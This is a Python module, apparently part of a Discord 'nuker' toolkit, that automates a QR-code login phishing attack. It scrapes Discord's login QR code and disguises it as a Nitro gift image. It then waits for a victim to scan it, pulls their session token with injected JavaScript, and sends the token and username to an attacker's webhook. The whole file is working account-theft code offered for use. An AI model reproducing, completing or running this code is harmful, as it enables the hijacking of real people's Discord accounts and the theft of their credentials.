import requests
import undetected_chromedriver as uc
import os
import json
import base64
import Mark

from PIL import Image
from zipfile import ZipFile
from time import sleep
from selenium import webdriver
from bs4 import BeautifulSoup
from colorama import Fore

from util.plugins.common import getheaders, proxy

def logo_qr():
    #Paste the discord logo onto the QR code
    im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55), im2)
    im1.save('QR-Code/Qr_Code.png', quality=95)

def paste_template():
    #paste the finished QR code onto the nitro template
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/Qr_Code.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('QR-Code/discord_gift.png', quality=95)

def QR_Grabber(Webhook):
    print(f"\n{Fore.GREEN}Checking Chromedriver. . .")
    sleep(0.5)
    #Checking if chromedriver already exists
    if os.path.exists(os.getcwd()+"\\chromedriver.exe"): 
        print(f"Chromedriver already exists, continuing. . .{Fore.RESET}")
        sleep(0.5)
    else:
        #installing chromdriver
        print(f"{Fore.RED}Chromedriver not found! Installing it for you")
        uc.install()

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging']) #disable logging
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login') #get discord url so we can log the token
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    #Create the QR code
    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    print(f"\n{Fore.WHITE}Downloading templates for QR code")

    # Download qr code templates
    qr_download = requests.get("")
    with open("QR-Code.zip", 'wb')as zip1:
        zip1.write(qr_download.content)
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    #remove the templates
    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")

    print(f'\nQR Code generated in '+os.getcwd()+"\\QR-Code")
    print(f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
    print(f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    print(f'\nOpening a new MarkNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
    try:
        os.startfile("MarkNuker.exe")
    except:
        print(f"Failed to open MarkNuker, did you rename it or moved it somewhere else?")
        pass

    #Waiting for them to scan QR code
    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            print(token)
            j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
            a = j['username'] + "#" + j['discriminator']
            requests.post(Webhook, json = {"content" : f"**Username:** {a}\n**Token:** `{token}`"})
            break